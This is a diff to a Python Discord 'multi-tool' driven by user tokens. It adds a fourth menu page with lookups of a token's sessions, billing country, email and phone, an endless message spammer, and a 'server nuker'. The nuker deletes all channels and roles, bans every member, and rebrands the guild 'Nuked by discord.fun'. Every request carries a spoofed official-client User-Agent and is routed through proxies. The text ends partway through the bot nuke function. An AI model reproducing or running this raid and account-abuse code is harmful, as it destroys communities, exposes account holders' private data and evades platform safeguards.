@@ -3,16 +3,23 @@ import os
 import platform
 import time
 from itertools import cycle
+
+import aiohttp
 from discord_webhook import DiscordWebhook
 import requests
 from colorama import Fore, init
 from lxml.html import fromstring
+from datetime import datetime
+import discord
+from discord.ext import commands
 
 init()
 
 current_directory = os.getcwd()
 folder_name = os.path.basename(current_directory)
 username = os.getenv("USERNAME")
+# Base URL for Discord API
+BASE_URL = 'https://discord.com/api/v10'
 
 if not os.path.exists('config.txt'):
     with open('config.txt', 'w') as f:
@@ -82,6 +89,7 @@ def menu_page_3():
                 {Fore.LIGHTWHITE_EX}6 - Send message to group id or ids
                 {Fore.LIGHTWHITE_EX}7 - Discord Webhook Spammer
                 {Fore.LIGHTWHITE_EX}8 - Send message to webhook
+                {Fore.LIGHTWHITE_EX}9 - Go to page 4
                 {Fore.LIGHTWHITE_EX}0 - Back to page 2
                 {Fore.RESET}
     """)
@@ -96,7 +104,14 @@ def menu_page_4():
 {Fore.CYAN} |     | |  |\    \     ||     ||  .  \|     ||  ||  |   |     ||  |  |
 {Fore.CYAN} |_____||____|\___|\____| \___/ |__|\_||_____||__||__|    \__,_||__|__|
 {Fore.RESET}
-                {Fore.LIGHTWHITE_EX}1 - test 4
+                {Fore.LIGHTWHITE_EX}1 - Get Discord Nitro expiration by token
+                {Fore.LIGHTWHITE_EX}2 - Get Country Code by token
+                {Fore.LIGHTWHITE_EX}3 - Get sessions by token
+                {Fore.LIGHTWHITE_EX}4 - Spammer
+                {Fore.LIGHTWHITE_EX}5 - Hypesquad changer
+                {Fore.LIGHTWHITE_EX}6 - Create Webhook by token
+                {Fore.LIGHTWHITE_EX}7 - Discord server nuker by token
+                {Fore.LIGHTWHITE_EX}8 - Get basic user info by token
                 {Fore.LIGHTWHITE_EX}0 - Back to page 3
                 {Fore.RESET}
     """)
@@ -139,7 +154,8 @@ def typer(channelid, token):
 
     headers = {
         "Content-Type": 'text/html; charset=utf-8',
-        "Authorization": token
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     proxy = next(proxy_pool)
     response = requests.post(url=request, headers=headers, proxies={"http": proxy})
@@ -155,7 +171,10 @@ def typer(channelid, token):
         print("Error: Unknown, no content")
 def get_friends_list(token):
     url = "https://discord.com/api/v9/users/@me/relationships"
-    headers = {"Authorization": token}
+    headers = {
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.get(url, headers=headers, proxies={"http": proxy})
 
@@ -169,7 +188,10 @@ def get_friends_list(token):
 
 def get_friends_list_user(token):
     url = "https://discord.com/api/v9/users/@me/relationships"
-    headers = {"Authorization": token}
+    headers = {
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.get(url, headers=headers, proxies={"http": proxy})
 
@@ -198,7 +220,8 @@ def get_discord_guilds(token):
 def get_discord_guilds_user(token):
     url = "https://discord.com/api/v10/users/@me/guilds"
     headers = {
-        "Authorization": f"{token}"
+        "Authorization": f"{token}",
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     response = requests.get(url, headers=headers, proxies={"http": proxy})
@@ -214,7 +237,8 @@ def send_message_group(channel_id, message_content, discord_token):
     url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
     headers = {
         'Authorization': f'{discord_token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     payload = {
         'content': message_content
@@ -238,7 +262,8 @@ def change_name_group(channel_id, message_content, discord_token):
     url = f'https://discord.com/api/v9/channels/{channel_id}'
     headers = {
         'Authorization': f'{discord_token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     payload = {
         'name': message_content
@@ -263,7 +288,10 @@ def change_bio(token, bio):
     payload = {
         "bio": bio,
     }
-    headers = {"Content-Type": "application/json", "Authorization": token}
+    headers = {
+        "Content-Type": "application/json", "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -281,7 +309,11 @@ def change_display_name(token, display_name):
     payload = {
         'global_name': display_name,
     }
-    headers = {"Content-Type": "application/json", "Authorization": token}
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -299,7 +331,8 @@ def thread_spammer(token, channel_id, message_id, thread_name):
     request_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/threads'
     headers = {
         'Authorization': f'{token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     payload = {
         'name': thread_name
@@ -321,7 +354,8 @@ def thread_spammer(token, channel_id, message_id, thread_name):
     request_url = f'https://discord.com/api/v9/channels/{thread_data["id"]}'
     headers = {
         'Authorization': f'{token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     response = requests.delete(request_url, headers=headers)
     if response.status_code == 200:
@@ -335,12 +369,38 @@ def thread_spammer(token, channel_id, message_id, thread_name):
     else:
         print("Error: " + response.json())
 
+def get_info_user(token):
+    request_url = "https://discord.com/api/v9/users/@me"
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+    try:
+        response = requests.get(request_url, headers=headers)
+        response.raise_for_status()  # Raise an HTTPError for bad responses
+        user_info = response.json()
+        print("Getting information successfully")
+        print("Display Name:", user_info.get("global_name", "N/A"))
+        print("User Name:", user_info.get("username", "N/A"))
+        print("Bio:", user_info.get("bio", "N/A"))
+        print("Id:", user_info.get("id", "N/A"))
+        print("MFA Enabled:", user_info.get("mfa_enabled", "N/A"))
+        print("Email:", user_info.get("email", "N/A"))
+        print("Phone:", user_info.get("phone", "N/A"))
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+
 def change_pronouns(token, pronouns):
     request_url = "https://discord.com/api/v9/users/@me/profile"
     payload = {
         'pronouns': pronouns,
     }
-    headers = {"Content-Type": "application/json", "Authorization": token}
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -359,7 +419,11 @@ def change_username(username, password, token):
         'password': password,
         'username': username
     }
-    headers = {"Content-Type": "application/json", "Authorization": token}
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -383,7 +447,10 @@ def get_token(email, password):
         "login_source": None,
         "gift_code_sku_id": None,
     }
-    headers = {"Content-Type": "application/json"}
+    headers = {
+        "Content-Type": "application/json",
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.post(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -414,7 +481,11 @@ def change_custom_status(encoded_str, replacements, token):
     payload = {
         "settings": modified_encoded_str
     }
-    headers = {"Content-Type": "application/json", 'Authorization': token}
+    headers = {
+        "Content-Type": "application/json",
+        'Authorization': token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})
 
@@ -429,6 +500,7 @@ def get_channels_id(guild_id, token):
     headers = {
         'Authorization': token,
         'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, proxies={"http": proxy})
@@ -444,6 +516,7 @@ def get_channels_id_sys(guild_id, token):
     headers = {
         'Authorization': token,
         'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, proxies={"http": proxy})
@@ -457,7 +530,8 @@ def get_channels_id_sys(guild_id, token):
 
 def join_server(invite_link, TOKEN):
     HEADERS = {
-        'Authorization': TOKEN
+        'Authorization': TOKEN,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     invite_code = invite_link.split('/')[-1]
@@ -470,7 +544,11 @@ def join_server(invite_link, TOKEN):
     else:
         print(f'Failed to join server: {response.status_code} - {response.text}')
 def send_message_to_friend(token, message_content, id):
-    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
 
     for friend_id in id:
         proxies = get_proxies()
@@ -495,7 +573,11 @@ def send_message_to_friend(token, message_content, id):
 
 
 def send_message_to_channel(token, message_content, channel_ids):
-    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
     proxies = get_proxies()
     proxy_pool = cycle(proxies)
     for channel_id in channel_ids:
@@ -517,7 +599,8 @@ def send_message_to_channel(token, message_content, channel_ids):
 def get_discord_group_dms(token):
     url = 'https://discord.com/api/v10/users/@me/channels'
     headers = {
-        'Authorization': token
+        'Authorization': token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     response = requests.get(url, headers=headers, proxies={"http": proxy})
@@ -528,6 +611,31 @@ def get_discord_group_dms(token):
         return group_dms
     else:
         response.raise_for_status()
+
+def hypesquad(token, house_id):
+    url = 'https://discord.com/api/v9/hypesquad/online'
+    headers = {
+        'Authorization': f'{token}',
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+    payload = {
+        'house_id': house_id
+    }
+
+    proxies = get_proxies().pop()  # Adjust if needed
+    try:
+        response = requests.post(url, headers=headers, json=payload, proxies={"http": proxies})
+        response.raise_for_status()  # Raise an exception for HTTP errors
+
+        if response.status_code == 204:
+            print("Successfully changed the HypeSquad badge")
+        else:
+            print(f"Error {response.status_code}: {response.text}")
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+
+
 
 def print_group_dms(group_dms):
     for dm in group_dms:
@@ -544,7 +652,8 @@ def send_message_to_group(token, message, channel_id):
     url = f'https://discord.com/api/v10/channels/{channel_id}/messages'
     headers = {
         'Authorization': f'{token}',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
     payload = {
         'content': message
@@ -557,12 +666,95 @@ def send_message_to_group(token, message, channel_id):
     else:
         print(f"Failed to send message to channel ID {channel_id}: {response.status_code} {response.text}")
 
+def convert_iso_to_readable(iso_timestamp):
+    dt = datetime.fromisoformat(iso_timestamp.replace("Z", "+00:00"))
+    return dt.strftime("%d %B %Y, %H:%M:%S (UTC)")
+
+def discord_nitro_expire(token):
+    url = 'https://discord.com/api/v9/users/@me/billing/subscriptions'
+    headers = {
+        'Authorization': f'{token}',
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    response = requests.get(url, headers=headers, proxies={"http": get_proxies().pop()})
+
+    if response.status_code == 200:
+        subscriptions = response.json()
+        if subscriptions:
+            for subscription in subscriptions:
+                current_period_start = convert_iso_to_readable(subscription['current_period_start'])
+                current_period_end = convert_iso_to_readable(subscription['current_period_end'])
+                print(f"Current Period Start: {current_period_start}")
+                print(f"Current Period End: {current_period_end}")
+        else:
+            print("No active subscriptions found.")
+    else:
+        print(f"Error {response.status_code}: {response.text}")
+
+def get_sessions(token):
+    url = 'https://discord.com/api/v9/auth/sessions'
+    headers = {
+        'Authorization': f'{token}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    proxies = get_proxies()  # Adjust if needed
+    try:
+        response = requests.get(url, headers=headers, proxies={"http": proxies.pop()})
+        response.raise_for_status()  # Raise an exception for HTTP errors
+
+        if response.status_code == 200:
+            sessions = response.json()
+            if sessions:
+                for session in sessions.get('user_sessions', []):
+                    client_info = session.get('client_info', {})
+                    os = client_info.get('os', 'N/A')
+                    platform = client_info.get('platform', 'N/A')
+                    location = client_info.get('location', 'N/A')
+                    print(f"\nOS: {os}")
+                    print(f"PLATFORM: {platform}")
+                    print(f"LOCATION: {location}")
+            else:
+                print("No sessions found.")
+        else:
+            print(f"Error {response.status_code}: {response.text}")
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+
+
+def country_code_by(token):
+    url = 'https://discord.com/api/v9/users/@me/billing/country-code'
+    headers = {
+        'Authorization': f'{token}',
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    try:
+        response = requests.get(url, headers=headers, proxies={"http": get_proxies().pop()})
+        response.raise_for_status()  # Will raise an HTTPError for bad responses
+
+        if response.status_code == 200:
+            data = response.json()
+            if 'country_code' in data:
+                country_code = data['country_code']
+                print(f"Country code: {country_code}")
+            else:
+                print("Country code not found in response.")
+        else:
+            print(f"Error {response.status_code}: {response.text}")
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+
 
 def leaver(token, guild_id):
     url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'
 
     headers = {
         'Authorization': f'{token}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
     }
 
     response = requests.delete(url, headers=headers, proxies={"http": proxy})
@@ -572,6 +764,180 @@ def leaver(token, guild_id):
     else:
         print(f'Failed to leave the server. Status code: {response.status_code}, Response: {response.text}')
 
+def create_webhook(token, channel_id, webhook_name):
+    url = f"https://discord.com/api/v10/channels/{channel_id}/webhooks"
+
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    json_data = {
+        "name": webhook_name
+    }
+    proxy = get_proxies().pop()
+    response = requests.post(url, headers=headers, json=json_data, proxies={"http": proxy})
+
+    if response.status_code == 200:
+        webhook_info = response.json()
+        print(f"Webhook created: {webhook_info['url']}")
+    else:
+        print(f"Error: {response.status_code}")
+        print(response.json())
+
+def delete_channels(guild_id, token):
+    # Headers for authorization
+    HEADERS = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+    # Get all channels
+    proxy = get_proxies().pop()
+    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/channels', headers=HEADERS, proxies={"http": proxy})
+    if response.status_code == 200:
+        channels = response.json()
+        for channel in channels:
+            try:
+                channel_id = channel['id']
+                # Delete channel
+                proxy = get_proxies().pop()
+                requests.delete(f'{BASE_URL}/channels/{channel_id}', headers=HEADERS, proxies={"http": proxy})
+                print(f'Channel {channel["name"]} deleted.')
+            except Exception as e:
+                print(f'Failed to delete channel {channel["name"]}: {e}')
+    else:
+        print('Failed to retrieve channels:', response.json())
+
+def delete_roles(guild_id, token):
+    # Headers for authorization
+    HEADERS = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+    # Get all roles
+    proxy = get_proxies().pop()
+    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/roles', headers=HEADERS, proxies={"http": proxy})
+    if response.status_code == 200:
+        roles = response.json()
+        for role in roles:
+            if role['name'] != "@everyone":  # Do not delete @everyone role
+                try:
+                    role_id = role['id']
+                    # Delete role
+                    requests.delete(f'{BASE_URL}/guilds/{guild_id}/roles/{role_id}', headers=HEADERS, proxies={"http": proxy})
+                    print(f'Role {role["name"]} deleted.')
+                except Exception as e:
+                    print(f'Failed to delete role {role["name"]}: {e}')
+    else:
+        print('Failed to retrieve roles:', response.json())
+
+def ban_members(guild_id, token):
+    # Headers for authorization
+    HEADERS = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+    # Get all members
+    proxy = get_proxies().pop()
+    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/members', headers=HEADERS, proxies={"http": proxy})
+    if response.status_code == 200:
+        members = response.json()
+        for member in members:
+            if member['user']['id'] != guild_id:  # Do not ban server owner
+                try:
+                    user_id = member['user']['id']
+                    # Ban member
+                    proxy = get_proxies().pop()
+                    requests.put(f'{BASE_URL}/guilds/{guild_id}/bans/{user_id}', headers=HEADERS, proxies={"http": proxy})
+                    print(f'{member["user"]["username"]} banned.')
+                except Exception as e:
+                    print(f'Failed to ban {member["user"]["username"]}: {e}')
+    else:
+        print('Failed to retrieve members:', response.json())
+
+def get_picture_by_url(IMAGE_URL):
+    # Получаем изображение по URL
+    response = requests.get(IMAGE_URL)
+    if response.status_code != 200:
+        print(f'Failed to fetch image: {response.status_code} - {response.text}')
+    return response.content
+
+def change_logo_guild(image_data, TOKEN, GUILD_ID):
+    base64_image = base64.b64encode(image_data).decode('utf-8')
+    headers = {
+        'Authorization': TOKEN,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    url = f'https://discord.com/api/v9/guilds/{GUILD_ID}'
+
+    # Формируем данные для PATCH-запроса
+    json_data = {
+        'icon': f'data:image/png;base64,{base64_image}'
+    }
+
+    # Отправляем PATCH-запрос для изменения аватарки
+    response = requests.patch(
+        url,
+        headers=headers,
+        json=json_data
+    )
+    if response.status_code == 200:
+        print('Server icon changed successfully.')
+    else:
+        print(f'Failed to change server icon: {response.status_code} - {response.text}')
+
+def change_description(description, TOKEN, GUILD_ID):
+    headers = {
+        'Authorization': TOKEN,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+    }
+
+    url = f'https://discord.com/api/v9/guilds/{GUILD_ID}'
+
+    # Формируем данные для PATCH-запроса
+    json_data = {
+        'description': description
+    }
+
+    # Отправляем PATCH-запрос для изменения аватарки
+    response = requests.patch(
+        url,
+        headers=headers,
+        json=json_data
+    )
+    if response.status_code == 200:
+        print(f'Successfully changed server description to {description}.')
+    else:
+        print(f'Failed to change server description: {response.status_code} - {response.text}')
+
+def change_server_name(guild_id, new_name, token):
+    # Headers for authorization
+    HEADERS = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+    # Endpoint for updating guild information
+    url = f'{BASE_URL}/guilds/{guild_id}'
+
+    # Data to be sent with the request
+    data = {
+        'name': new_name
+    }
+
+    # Send PATCH request to update the server name
+    response = requests.patch(url, headers=HEADERS, json=data)
+
+    if response.status_code == 200:
+        print(f'Successfully changed server name to "{new_name}".')
+    else:
+        print(f'Failed to change server name: {response.status_code}, {response.json()}')
 
 def clear():
     os.system("cls" if platform.system() == "Windows" else "clear")
@@ -638,6 +1004,11 @@ while True:
                 headers = {
                     'Authorization': f'{token}',
                     'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+                }
+
+                payload = {
+                    'user_premium_guild_subscription_slot_ids': f'{server_id}'
                 }
 
                 for _ in range(int(boost_count)):
@@ -645,9 +1016,9 @@ while True:
                     proxy_pool = cycle(proxies)
                     proxy = next(proxy_pool)
                     time.sleep(0.5)
-                    response = requests.post(url, headers=headers, proxies={"http": proxy})
+                    response = requests.post(url, headers=headers, json=payload, proxies={"http": proxy})
 
-                    if response.status_code in [200, 201]:
+                    if response.status_code == 201:
                         print(f'Server boosted successfully!')
                     else:
                         print(f'Failed to boost server. Status code: {response.status_code}')
@@ -772,6 +1143,141 @@ while True:
                             print("Successfully sended the message")
                         else:
                             print("Error: " + response.json())
+                    elif choice_page_3 == '9':
+                        while True:
+                            clear()
+                            menu_page_4()
+                            choice_page_4 = input(setting)
+                            if choice_page_4 == '1':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                discord_nitro_expire(token)
+                                input("Press enter to return to the main menu")
+                            elif choice_page_4 == '2':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                country_code_by(token)
+                                input("Press enter to return to the main menu")
+                            elif choice_page_4 == '3':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                get_sessions(token)
+                                input("Press enter to return to the main menu")
+                            elif choice_page_4 == "4":
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                message = input(Fore.CYAN + f"What message to send?: ")
+                                dm = input("Enter channel id (e.g. 1234567890): ")
+                                isenabled = True
+                                while isenabled:
+                                    send_message_to_group(token, message, dm)
+                            elif choice_page_4 == '5':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                house_id = input(Fore.CYAN + f"1 - Bravery\n2 - Brilliance\n3 - Balance\nEnter house_id: ")
+                                hypesquad(token, house_id)
+                                input("Press enter to return to the main menu")
+                            elif choice_page_4 == '6':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                channel_id = input(Fore.CYAN + f"Enter channel id: ")
+                                webhook_name = input(Fore.CYAN + f"Enter webhook name: ")
+                                create_webhook(token, channel_id, webhook_name)
+                            elif choice_page_4 == '7':
+                                choice_raid = input(Fore.LIGHTGREEN_EX + "Which type of raid do you prefer? (1 - Self-bot, 2 - Bot): ")
+                                if choice_raid == '1':
+                                    token = input(Fore.CYAN + f"Enter your token: ")
+                                    guild_id = input(Fore.CYAN + f"Enter guild id: ")
+                                    print('Starting server nuke...')
+                                    delete_channels(guild_id, token)
+                                    delete_roles(guild_id, token)
+                                    change_server_name(guild_id, "discord.fun", token)
+                                    IMAGE_URL = 'https://cdn.discordapp.com/icons/1255836516434051124/8ba9109d7cf6cc6e207c37b21e0c860d.webp?size=128&quot;);'
+                                    change_logo_guild(get_picture_by_url(IMAGE_URL), token, guild_id)
+                                    change_description("Nuked by discord.fun", token, guild_id)
+                                    print('Server has been nuked.')
+                                    input("Press enter to return to the main menu")
+                                elif choice_raid == '2':
+                                    # Ваш токен бота
+                                    TOKEN = input(Fore.CYAN + f"Enter bot token: ")
+                                    # Установка интентов для получения событий
+                                    intents = discord.Intents.default()
+                                    intents.members = True  # Разрешить боту видеть участников
+                                    intents.guilds = True  # Разрешить боту видеть сервера
+                                    intents.message_content = True # Разрешить боту видеть сообщения
+
+                                    # Создание экземпляра бота с интентами и префиксом команд
+                                    bot = commands.Bot(command_prefix='!', intents=intents)
+
+                                    async def fetch_image_bytes(url):
+                                        async with aiohttp.ClientSession() as session:
+                                            async with session.get(url) as response:
+                                                return await response.read()
+
+                                    @bot.event
+                                    async def on_ready():
+                                        print(f'Logged in as {bot.user.name}')
+                                        print('Write command "!nuke" in the chat when you ready')
+
+
+                                    @bot.command()
+                                    @commands.has_permissions(administrator=True)
+                                    async def nuke(ctx):
+                                        guild = ctx.guild
+
+                                        # Удаление всех каналов
+                                        for channel in guild.channels:
+                                            try:
+                                                await channel.delete()
+                                                print(f'Deleted channel: {channel.name}')
+                                            except discord.Forbidden:
+                                                print(f"Permission error when deleting channel {channel.name}.")
+                                            except discord.HTTPException as e:
+                                                print(f"HTTP exception when deleting channel {channel.name}: {e}")
+
+                                        # Удаление всех ролей
+                                        for role in guild.roles:
+                                            if role.name != '@everyone':  # Не удаляйте роль @everyone
+                                                try:
+                                                    await role.delete()
+                                                    print(f'Deleted role: {role.name}')
+                                                except discord.Forbidden:
+                                                    print(f"Permission error when deleting role {role.name}.")
+                                                except discord.HTTPException as e:
+                                                    print(f"HTTP exception when deleting role {role.name}: {e}")
+
+                                        # Бан всех участников
+                                        for member in guild.members:
+                                            if member != guild.owner:  # Не баньте владельца сервера
+                                                try:
+                                                    await member.ban(reason="Nuked by discord.fun")
+                                                    print(f'Banned member: {member.name}')
+                                                except discord.Forbidden:
+                                                    print(f"Permission error when banning member {member.name}.")
+                                                except discord.HTTPException as e:
+                                                    print(f"HTTP exception when banning member {member.name}: {e}")
+
+                                        # Изменение названия сервера
+                                        try:
+                                            await guild.edit(name='discord.fun')
+                                            print('Server name changed to discord.fun')
+                                        except discord.Forbidden:
+                                            print("Permission error when changing the server name.")
+                                        except discord.HTTPException as e:
+                                            print(f"HTTP exception when changing server name: {e}")
+
+                                        # Изменение логотипа сервера
+                                        try:
+                                            icon_bytes = await fetch_image_bytes("https://cdn.discordapp.com/icons/1255836516434051124/8ba9109d7cf6cc6e207c37b21e0c860d.webp?size=128&quot;);")
+                                            await guild.edit(icon=icon_bytes)
+                                            print('Server icon updated.')
+                                        except discord.Forbidden:
